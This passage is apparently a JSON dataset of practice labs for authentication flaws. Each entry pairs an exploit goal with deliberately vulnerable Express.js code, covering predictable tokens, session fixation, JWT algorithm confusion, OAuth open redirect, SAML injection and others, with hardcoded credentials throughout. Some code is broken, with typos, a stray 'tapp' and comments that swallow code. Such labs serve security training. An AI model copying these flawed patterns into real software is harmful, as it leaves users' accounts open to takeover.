      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [\n  { email: 'carlos@example.com', password: 'defaultPass' },\n  { email: 'attacker@example.com', password: 'hackMe' }\n];\n\nconst validTokens = new Map();\n\napp.post('/forgot-password', (req, res) => {\n  const { email } = req.body;\n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(404).send('User not found');\n  \n  const token = Math.random().toString(36).slice(2, 10);\n  validTokens.set(email, token);\n  res.send(`Password reset token sent to ${email}: ${token}`);\n});\n\n// VULNERABLE ENDPOINT: Token is validated without checking email-token binding\napp.post('/reset-password', (req, res) => {\n  const { email, token, newPassword } = req.body;\n  \n  // Flaw: Only checks if token exists, not which user it belongs to\n  if (![...validTokens.values()].includes(token)) {\n    return res.status(401).send('Invalid token');\n  }\n  \n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(404).send('User not found');\n  \n  user.password = newPassword;\n  validTokens.delete(email);\n  res.send('Password successfully reset');\n});\n\napp.post('/login', (req, res) => {\n  const { email, password } = req.body;\n  const user = users.find(u => u.email === email && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  res.send(`Logged in as ${email}`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Auth Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Credential Stuffing Attack",
      "labDescription": "This lab is vulnerable to credential stuffing attacks. The login system does not properly rate-limit failed login attempts, allowing an attacker to repeatedly try different username and password combinations. To solve the lab, successfully log in to the admin account using a brute-force attack.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'admin', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.send('Welcome, ' + username + '!'); }); const PORT = 4000; app.listen(PORT, () => console.log('Credential Stuffing Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit a weak password reset mechanism to access Carlos's account.",
      "labDescription": "The application has a password reset feature that generates a reset token identical to the username provided in the request. This allows an attacker to reset any user's password by simply using their username as the token. To solve the lab, request a password reset for the user 'attacker' to observe the token, then use 'carlos' as the token to reset Carlos's password, and log in to his account with the new password.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'weak_secret', resave: false, saveUninitialized: true }));\nlet users = { 'attacker': { password: 'attacker_pass' }, 'carlos': { password: 'carlos_pass' } };\napp.get('/login', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    req.session.username = username;\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/reset', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><button type=\"submit\">Request reset</button></form>'));\napp.post('/reset', (req, res) => {\n  const { username } = req.body;\n  if (users[username]) {\n    const token = username;\n    res.send(`A reset link has been sent: <a href=\"/reset-password?token=${token}\">Reset password</a>`);\n  } else {\n    res.status(404).send('User not found');\n  }\n});\napp.get('/reset-password', (req, res) => {\n  const { token } = req.query;\n  if (!token) return res.status(400).send('Token required');\n  res.send(`<form method=\"post\"><input name=\"token\" type=\"hidden\" value=\"${token}\"><input name=\"new_password\" type=\"password\"><button type=\"submit\">Reset password</button></form>`);\n});\napp.post('/reset-password', (req, res) => {\n  const { token, new_password } = req.body;\n  if (users[token]) {\n    users[token].password = new_password;\n    res.send(`Password for ${token} has been reset.`);\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Session Fixation Attack to Compromise Administrative Access",
      "labDescription": "This lab contains an Autnenticationvulnerability where the application does not regenerate session IDs after login, allowing session fixation. An attacker can force a user to authenticate with a known session ID and hijack their session. To solve the lab: 1. Obtain a valid session ID before authentication. 2. Trick Carlos (admin) into logging in with your pre-set session ID (simulated via CSRF/forced browsing). 3. Use the session ID to access the admin dashboard and delete all user data. The lab is solved when you execute the /admin/wipe endpoint as Carlos.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(cookieParser());\n\nconst sessions = new Map();\nconst users = [\n  { username: 'carlos', password: 's3cr3tAdm1n!', role: 'admin' },\n  { username: 'attacker', password: 'p@ssw0rd', role: 'user' }\n];\n\n// Generate initial session for demonstration\nconst initialSession = Math.random().toString(36).slice(2, 18);\nsessions.set(initialSession, { authenticated: false });\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  \n  if (!user) return res.status(401).send('Invalid credentials');\n  \n  // VULNERABILITY: Uses existing session ID if provided via cookie\n  const sessionId = req.cookies.sessionId || Math.random().toString(36).slice(2, 18);\n  \n  sessions.set(sessionId, {\n    authenticated: true,\n    username: user.username,\n    role: user.role\n  });\n  \n  res.cookie('sessionId', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.get('/admin/wipe', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const session = sessions.get(sessionId);\n  \n  if (!session?.authenticated || session.role !== 'admin') {\n    return res.status(403).send('Admin access required');\n  }\n  \n  // Lab solution trigger\n  res.send('All data wiped by ' + session.username);\n});\n\napp.get('/profile', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const session = sessions.get(sessionId);\n  \n  if (!session?.authenticated) {\n    return res.status(401).send('Not authenticated');\n  }\n  \n  res.send(`Welcome ${session.username} (${session.role})`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`hard Auth Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Exploit a lack of session timeout to access Alice's account after she logs out.",
      "labDescription": "The application does not invalidate session IDs after a user logs out or after a period of inactivity, allowing an attacker to reuse an old session ID to access a user's account. To solve the lab, capture Alice's session ID after she logs in, wait for her to log out, then use the same session ID to access her account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'simple_secret', resave: false, saveUninitialized: true }));\nconst users = { 'alice': 'alice_pass', 'attacker': 'attacker_pass' };\napp.get('/login', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.username = username;\n    res.send('Logged in! <a href=\"/account\">Account</a> <a href=\"/logout\">Logout</a>');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.username = null;\n  res.send('Logged out');\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 5000;\napp.listen(PORT, () => console.log(`Insecure Session Expiration Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypass Multi-Factor Autnenticationvia Brute-Forceable TOTP",
      "labDescription": "This lab implements weak Time-Based One-Time Password (TOTP) validation for multi-factor authentication. While the attacker has obtained Carlos's password, the MFA protection can be bypassed due to missing rate-limiting and code reuse prevention. To solve the lab: 1. Authenticate with Carlos's credentials (username: 'carlos', password: 'admin123'). 2. Brute-force the 6-digit TOTP code within 2 minutes of code validity. 3. Access the administrative panel at /admin to delete all records.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst speakeasy = require('speakeasy');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  password: 'admin123',\n  mfaSecret: speakeasy.generateSecret({ length: 20 }).base32,\n  isAdmin: true\n}];\n\nconst activeSessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  \n  if (!user) return res.status(401).send('Invalid credentials');\n  \n  // Return MFA requirement but expose vulnerability trigger\n  res.status(202).json({\n    message: 'MFA required',\n    remainingAttempts: 'unlimited' // Critical flaw: No attempt counter\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const { username, code } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  // VULNERABILITY: No rate-limiting + accepts old codes within 120s window\n  const verified = speakeasy.totp.verify({\n    secret: user.mfaSecret,\n    encoding: 'base32',\n    token: code,\n    window: 4 // Allows codes from 2 minutes before/after\n  });\n\n  if (!verified) return res.status(401).send('Invalid MFA code');\n\n  // Critical flaw: Doesn't invalidate used codes\n  const sessionToken = Buffer.from(username + Date.now()).toString('base64');\n  activeSessions.set(sessionToken, user);\n  res.json({ token: sessionToken });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const session = activeSessions.get(token);\n  \n  if (!session?.isAdmin) return res.status(403).send('Admin access required');\n  res.send('Admin panel: <button onclick=\"fetch('/admin/wipe')\">WIPE DATA</button>');\n});\n\napp.post('/admin/wipe', (req, res) => {\n  // Lab solution validation\n  res.send('All critical data deleted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`MFA Bypass Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Parameter Tampering Privilege Escalation",
      "labDescription": "This lab is vulnerable to privilege escalation through parameter tampering. The application uses a 'role' parameter passed in the login request to determine user permissions. The backend blindly trusts this parameter, allowing an attacker to escalate their privileges to admin. To solve the lab, exploit the 'role' parameter in the login request.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'user', password: 'password' }]; app.post('/login', (req, res) => { const { username, password, role } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Vulnerability: No validation or sanitization of the 'role' parameter if (role === 'admin') { res.send('Welcome, Admin! You can perform sensitive actions here.'); } else { res.send('Welcome, ' + username + '!'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Parameter Tampering Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Log into the system by exploiting unchanged default credentials.",
      "labDescription": "The application is a simple web server with a login page. It was deployed with default credentials that were never changed: username 'admin' and password 'admin'. Your task is to log into the system using these default credentials. Once logged in, you will see a 'Welcome, admin!' message, indicating success.",
      "vulnerabilityName": "Autnentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Default credentials\nconst users = { 'admin': 'admin' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send(\"<form method='post'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Login</button></form>\");\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'admin') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 7000;\napp.listen(PORT, () => console.log(`Insecure Default Credentials Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "JWT Algorithm Confusion to Gain Administrative Privileges",
      "labDescription": "This lab uses JSON Web Tokens (JWT) for Autnenticationbut fails to validate the signing algorithm properly. The server exposes its public key, enabling attackers to exploit algorithm confusion. To solve the lab: 1. Obtain the server's public key from the exposed JWKS endpoint. 2. Forge an admin JWT by switching the algorithm from RS256 to HS256. 3. Access the /admin/export endpoint to download sensitive data. You start with valid low-privilege credentials (user: attacker, password: p@ssw0rd).",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\napp.use(bodyParser.json());\n\n// Server's key pair\nconst privateKey = `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC+8Zbn3NROZ/9L\n...[truncated]...\n3ZtC4x7SJ0miwIDAQAB\n-----END PRIVATE KEY-----`;\nconst publicKey = `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvvGW59zUTmf/S0b4tAxs\n...[truncated]...\nNG0LjHtInSaLAgMBAAE=\n-----END PUBLIC KEY-----`;\n\nconst users = [\n  { username: 'attacker', password: 'p@ssw0rd', role: 'user' },\n  { username: 'carlos', password: 's3cr3t!', role: 'admin' }\n];\n\n// Vulnerable JWKS endpoint\ntapp.get('/.well-known/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      kid: '1',\n      use: 'sig',\n      n: 'vrGW59zUTmf_S0b4tAxs...',\n      e: 'AQAB'\n    }]\n  });\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n\n  // Generate JWT with vulnerable configuration\n  const token = jwt.sign(\n    { user: username, role: user.role },\n    privateKey,\n    { algorithm: 'RS256', expiresIn: '1h' }\n  );\n  res.json({ token });\n});\n\n// Vulnerable JWT verification middleware\nconst verifyToken = (req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!token) return res.status(401).send('Unauthorized');\n\n  // Critical flaw: No algorithm enforcement\n  jwt.verify(token, (header, callback) => {\n    jwksClient.getSigningKey(header.kid, (err, key) => {\n      callback(err, key?.publicKey || publicKey);\n    });\n  }, { algorithms: ['RS256', 'HS256'] }, (err, decoded) => {\n    if (err) return res.status(401).send('Invalid token');\n    req.user = decoded;\n    next();\n  });\n};\n\napp.get('/admin/export', verifyToken, (req, res) => {\n  if (req.user.role !== 'admin') return res.status(403).send('Admin required');\n  res.send('SECRET DATA: Credit card records of all users');\n});\n\napp.get('/profile', verifyToken, (req, res) => {\n  res.send(`Logged in as ${req.user.user} (${req.user.role})`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predictable AutnenticationTokens",
      "labDescription": "This lab uses predictable Autnenticationtokens in URLs. The tokens follow a simple pattern (e.g., 'user1-token', 'user2-token'), allowing an attacker to guess other users' tokens. To solve the lab, access another user's profile by modifying the token in the URL.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = { 'user1': { token: 'user1-token', data: 'User 1 data' }, 'user2': { token: 'user2-token', data: 'User 2 data' } }; app.get('/profile', (req, res) => { const token = req.query.token; const user = Object.keys(users).find(u => users[u].token === token); if (!user) return res.status(401).send('Unauthorized'); res.send('Welcome, ' + user + '! Data: ' + users[user].data); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Token Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit an insecure 'Remember Me' feature to access the admin account.",
      "labDescription": "The application has a 'Remember Me' feature that stores the username in a cookie. When this cookie is present, the application automatically logs in the user as that username without further verification. To solve the lab, set the 'remember_user' cookie to 'admin' and visit the login page to be automatically logged in as admin, then access the account page to confirm.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(cookieParser());\napp.use(session({ secret: 'simple_secret', resave: false, saveUninitialized: true }));\nconst users = { 'user': 'pass', 'admin': 'adminpass' };\napp.get('/login', (req, res) => {\n  if (req.cookies.remember_user && users[req.cookies.remember_user]) {\n    req.session.user = req.cookies.remember_user;\n    res.redirect('/account');\n  } else {\n    res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><input type=\"checkbox\" name=\"rememberMe\"> Remember Me<button type=\"submit\">Login</button></form>');\n  }\n});\napp.post('/login', (req, res) => {\n  const { username, password, rememberMe } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.user = username;\n    if (rememberMe) {\n      res.cookie('remember_user', username, { maxAge: 30 * 24 * 60 * 60 * 1000 });\n    }\n    res.redirect('/account');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome, ${req.session.user}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.destroy();\n  res.clearCookie('remember_user');\n  res.send('Logged out');\n});\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Insecure Remember Me Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "OAuth Token Hijacking via Open Redirect and Missing State Parameter Validation",
      "labDescription": "This lab contains a vulnerable OAuth 2.0 implementation where attackers can steal authorization codes through an open redirect vulnerability and gain full account access. The system fails to validate the 'state' parameter and allows arbitrary redirect URIs. To solve the lab: 1. Exploit the open redirect in /redirect endpoint to capture Carlos's authorization code. 2. Exchange the stolen code for an access token. 3. Use the token to access Carlos's private notes at /notes and delete the critical document. You start with a phishing page at http://attacker.com/callback.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\n// OAuth server configuration\nconst clients = [{\n  client_id: 'vulnerable-app',\n  client_secret: 's3cr3t',\n  redirect_uris: ['http://localhost:4000/callback']\n}];\n\nconst users = [{\n  id: 'carlos',\n  password: 'Winter2023!',\n  notes: ['SECRET: Nuclear launch codes = 000000']\n}];\n\nlet authCodes = new Map();\nlet accessTokens = new Map();\n\n// Vulnerable open redirect endpoint\napp.get('/redirect', (req, res) => {\n  const { url } = req.query;\n  res.redirect(decodeURIComponent(url)); // No validation of redirect targets\n});\n\n// OAuth authorization endpoint\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const client = clients.find(c => c.client_id === client_id);\n  \n  // Critical flaw: No redirect_uri validation\n  if (!client) return res.status(400).send('Invalid client');\n  \n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes.set(code, { user: 'carlos', client_id });\n  \n  // Vulnerability: State parameter not validated/echoed\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\n// OAuth token endpoint\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  const client = clients.find(c => c.client_id === client_id);\n  \n  if (!client || client.client_secret !== client_secret) {\n    return res.status(401).send('Invalid client credentials');\n  }\n  \n  if (!authCodes.has(code)) return res.status(400).send('Invalid code');\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens.set(token, authCodes.get(code));\n  authCodes.delete(code);\n  \n  res.json({ access_token: token, token_type: 'Bearer' });\n});\n\n// Protected resource\napp.get('/notes', (req, res) => {\n  const authHeader = req.headers.authorization;\n  const token = authHeader?.split(' ')[1];\n  const session = accessTokens.get(token);\n  \n  if (!session) return res.status(401).send('Invalid token');\n  \n  const user = users.find(u => u.id === session.user);\n  res.json(user.notes);\n});\n\napp.delete('/notes', (req, res) => {\n  // Lab solution validation endpoint\n  res.send('Critical documents deleted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Horizontal Privilege Escalation via User ID Manipulation",
      "labDescription": "This lab allows users to access other users' profiles by manipulating the user ID parameter in the URL. The application does not validate whether the authenticated user is authorized to access the requested profile. To solve the lab, access another user's profile by modifying the user ID in the profile URL.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = { 1: { id: 1, name: 'Alice', email: 'alice@example.com' }, 2: { id: 2, name: 'Bob', email: 'bob@example.com' } }; app.get('/profile/:userId', (req, res) => { const userId = parseInt(req.params.userId); const user = users[userId]; if (!user) return res.status(404).send('User not found'); res.json(user); }); const PORT = 4000; app.listen(PORT, () => console.log('Horizontal Privilege Escalation Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit a weak password policy to guess a user's password.",
      "labDescription": "The application enforces a weak password policy that allows very short and simple passwords (e.g., minimum 3 characters, no complexity requirements). Your task is to guess the password for the user 'user1' and log into their account. Hint: The password is a common three-letter word.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated database with user credentials\nconst users = { 'user1': 'cat', 'admin': 'dog' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "SAML AutnenticationBypass via XML Comment Injection and Signature Wrapping",
      "labDescription": "This lab implements a vulnerable SAML-based SSO system that improperly validates XML signatures and allows comment injection in assertions. Attackers can manipulate SAML responses to impersonate administrators. To solve the lab: 1. Capture a valid SAML response during login. 2. Inject XML comments to alter the NameID and attributes while preserving the valid signature. 3. Bypass signature validation to access the /internal/dashboard as an administrator and execute the system shutdown command.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst xmldom = require('xmldom');\nconst xpath = require('xpath');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.text({ type: '*/xml' }));\n\nconst trustedCertificate = `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvZxTR6...\n-----END PUBLIC KEY-----`;\n\n// Simulated IdP metadata\nconst idpMetadata = {\n  issuer: 'https://saml-idp.example.com',\n  signingCert: trustedCertificate\n};\n\n// Vulnerable SAML validation\nconst validateSamlResponse = (samlResponse) => {\n  const doc = new xmldom.DOMParser().parseFromString(samlResponse);\n  \n  // Extract signature\n  const signature = xpath.select(\"//*[local-name()='Signature']\", doc)[0];\n  if (!signature) return false;\n  \n  // Verify signature cryptographically\n  const verifier = crypto.createVerify('RSA-SHA256');\n  const signedInfo = xpath.select(\".//*[local-name()='SignedInfo']\", signature)[0].toString();\n  verifier.update(signedInfo);\n  \n  const signatureValue = xpath.select(\".//*[local-name()='SignatureValue']\", signature)[0].textContent;\n  const validSig = verifier.verify(idpMetadata.signingCert, signatureValue, 'base64');\n  \n  // Critical flaw: Doesn't re-validate parsed data after signature check\n  return validSig;\n};\n\napp.post('/saml/acs', async (req, res) => {\n  try {\n    if (!validateSamlResponse(req.body)) return res.status(403).send('Invalid SAML response');\n    \n    // Vulnerable XML parsing with comment preservation\n    const parser = new xml2js.Parser({ preserveChildren: true, explicitChildren: true });\n    const result = await parser.parseStringPromise(req.body);\n    \n    // Extract NameID with comment injection vulnerability\n    const assertion = result['samlp:Response']['saml:Assertion'][0];\n    const nameId = assertion['saml:Subject'][0]['saml:NameID'][0];\n    \n    // Process attributes without proper validation\n    const attributes = assertion['saml:AttributeStatement'][0]['saml:Attribute'];\n    const roles = attributes.find(a => a.$.Name === 'roles')['saml:AttributeValue'];\n    \n    // Grant access based on manipulated values\n    if (roles.includes('admin')) {\n      res.send('Admin dashboard: <button onclick=\"fetch('/internal/shutdown')\">SHUTDOWN</button>');\n    } else {\n      res.status(403).send('Insufficient privileges');\n    }\n  } catch (error) {\n    res.status(500).send('SAML processing error');\n  }\n});\n\napp.post('/internal/shutdown', (req, res) => {\n  res.send('Critical systems halted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predictable Password Reset Tokens",
      "labDescription": "This lab's password reset functionality uses predictable tokens that follow a simple pattern (e.g., 'user1-reset', 'user2-reset'). Attackers can guess other users' reset tokens to reset their passwords. To solve the lab, reset the password for the 'admin' account by guessing its reset token.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = { 'user1': { password: 'password1', resetToken: 'user1-reset' }, 'admin': { password: 'admin123', resetToken: 'admin-reset' } }; app.get('/reset-password/:token', (req, res) => { const token = req.params.token; const user = Object.keys(users).find(u => users[u].resetToken === token); if (!user) return res.status(404).send('Invalid reset token'); users[user].password = 'newPassword'; res.send('Password reset successful for ' + user); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Reset Token Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit hardcoded credentials to log in as an admin user.",
      "labDescription": "The application contains hardcoded credentials embedded in its source code. Your task is to examine the code, identify the admin username and password, and use them to log in. Once successful, you'll see a welcome message confirming your access as an admin.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hardcoded admin credentials\nconst ADMIN_USERNAME = 'admin';\nconst ADMIN_PASSWORD = 'secret123';\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {\n    res.send(`Welcome, ${username}! You have admin access.`);\n  } else {\n    res.status(401).send('Login failed: Incorrect username or password');\n  }\n});\n\nconst PORT = 9000;\napp.listen(PORT, () => console.log(`hardcoded Credentials Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predictable Session Tokens",
      "labDescription": "This lab uses predictable session tokens derived from usernames. When a user logs in, the session token is set to 'user-<username>'. An attacker can guess other users' session tokens by knowing their usernames. To solve the lab, access another user's profile by modifying the session token in the cookie.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'alice', password: 'password123' }, { username: 'bob', password: 'password456' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Set predictable session token res.cookie('session', 'user-' + user.username); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const session = req.cookies.session; if (!session) return res.status(401).send('Unauthorized'); const parts = session.split('-'); if (parts.length !== 2 || parts[0] !== 'user') return res.status(401).send('Invalid session'); const username = parts[1]; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + username); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Session Tokens Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit an insecure Autnenticationmechanism by manipulating a cookie to bypass the login process.",
      "labDescription": "The application uses a cookie named 'authenticated' to determine if a user is logged in. If the cookie is set to 'true', the application grants access to the protected area without checking the user's credentials. To solve the lab, use your browser's developer tools to set the 'authenticated' cookie to 'true' and then visit the '/account' page to gain access without logging in.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(cookieParser());\nconst users = { 'user': 'pass' };\napp.get('/login', (req, res) => {\n  res.send(\"<form method='post'><input name='username'><input name='password' type='password'><button type='submit'>Login</button></form>\");\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.cookie('authenticated', 'true');\n    res.redirect('/account');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.cookies.authenticated === 'true') {\n    res.send('Welcome to your account!');\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 10000;\napp.listen(PORT, () => console.log(`AutnenticationBypass Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypass Session Termination via Stale Password Hash Validation",
